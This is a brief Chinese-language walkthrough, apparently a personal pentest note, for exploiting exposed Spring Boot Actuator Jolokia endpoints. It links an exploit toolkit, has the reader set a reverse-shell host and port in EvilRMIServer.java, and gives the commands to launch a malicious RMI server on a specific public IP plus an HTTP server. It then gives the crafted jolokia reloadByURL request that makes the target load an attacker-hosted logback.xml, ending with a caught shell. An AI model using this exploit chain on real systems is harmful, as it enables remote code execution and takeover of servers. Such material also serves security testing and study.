springboot 2.0<br />/actuator/jolokia

springboot 1.0<br />/jolokia

**工具包**<br />[https://github.com/javalibrary/Spring-Boot-Actuator-Exploit](https://github.com/javalibrary/Spring-Boot-Actuator-Exploit)<br />/jolokia/list<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628085265450-cb547567-2b70-4122-8152-3d1dabab1fb3.png#align=left&display=inline&height=381&originHeight=761&originWidth=1171&size=194970&status=done&style=none&width=585.5)

EvilRMIServer.java文件修改反弹的vps和端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628085349715-d03b3763-15f5-446e-b7ea-ce2034dafb63.png#align=left&display=inline&height=197&originHeight=394&originWidth=1363&size=26745&status=done&style=none&width=681.5)<br />然后需要在maliciousRMIServer目录下打包成rmijar   mvn clean install<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628087514775-424ab925-6cbc-40b3-b5d0-186470fd6a7f.png#align=left&display=inline&height=348&originHeight=695&originWidth=1151&size=143719&status=done&style=none&width=575.5)<br />logback.xml  要注意这里用ldap还是用rmi<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628085387074-18c2a7b6-9489-4787-8bc3-6167f4e05153.png#align=left&display=inline&height=73&originHeight=97&originWidth=808&size=9472&status=done&style=none&width=606)

修改完之后传到服务器<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628085505935-b9576218-faf2-4d45-ac5a-25b4c24e4f6d.png#align=left&display=inline&height=76&originHeight=76&originWidth=511&size=8046&status=done&style=none&width=511)<br />分别启动 rmi和http、并进行nc的端口监听<br />java -Djava.rmi.server.hostname=121.4.236.95 -jar RMIServer-0.1.0.jar<br />python -m SimpleHTTPServer 8089

构造漏洞路径：<br />http://127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/ip:8089!/logback.xml

http有请求<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628086211362-5ddc42ef-260e-4a8b-8a15-fa5ba2a56752.png#align=left&display=inline&height=85&originHeight=85&originWidth=776&size=14301&status=done&style=none&width=776)<br />但是rmi是看不到有反应的。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628086253265-83cbec69-f0bc-4375-af5b-abab072dfcd8.png#align=left&display=inline&height=66&originHeight=66&originWidth=1018&size=8616&status=done&style=none&width=1018)

成功监听。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628086176493-aea4c23f-d474-4b19-a51d-0e1898b00e27.png#align=left&display=inline&height=158&originHeight=158&originWidth=437&size=13762&status=done&style=none&width=437)
